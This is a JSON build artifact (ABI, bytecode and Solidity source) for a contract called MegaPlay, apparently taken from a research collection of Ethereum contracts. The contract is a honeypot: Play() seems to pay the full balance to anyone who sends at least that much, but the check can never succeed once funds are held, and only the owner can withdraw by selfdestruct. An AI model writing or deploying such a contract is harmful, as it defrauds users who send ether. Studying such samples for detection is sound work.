{
  "contractName": "MegaPlay",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "end",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b5061013f806100606000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630e2dce691461004e578063efbe1c1c14610058575b005b61005661006f565b005b34801561006457600080fd5b5061006d61009a565b005b3073ffffffffffffffffffffffffffffffffffffffff163134101515610098576100976100fa565b5b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156100f8576100f76100fa565b5b565b3373ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820669b8615bfc6fec51ab18dc29fd1ec8bd47175026e933f4b73d77c866b31c9400029",
  "source": "\n\ncontract MegaPlay\n{\n    address Owner = msg.sender;\n\n    function() public payable {}\n    function close() private { selfdestruct(msg.sender); }\n\n    function Play() public payable {\n        if (msg.value >= address(this).balance) {\n           close();\n        }\n    }\n \n    function end() public {\n        if (msg.sender == Owner) {\n            close();\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xd8dfe62f20504bc474f00e9b3e6e305e46223c71/contracts/0xd8dfe62f20504bc474f00e9b3e6e305e46223c71.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:08:08.452Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}